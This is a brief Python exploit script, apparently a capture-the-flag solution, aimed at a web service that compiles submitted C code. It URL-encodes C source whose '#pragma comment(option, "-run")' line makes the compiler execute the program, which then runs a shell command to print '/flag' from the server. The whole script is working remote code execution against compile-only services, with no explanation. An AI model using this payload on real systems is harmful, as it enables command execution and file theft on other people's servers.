URL = "http://localhost:1337/"
URL = "http://5b964bb4-10f6-4d1b-a191-a1e4578261b7.bugg.cc/"

import requests, urllib

code = """
#pragma comment(option, "-run")

int main() {
  system("cat /flag");
}
"""

print(requests.get(f"{URL}?code=" + urllib.parse.quote(code)).text)
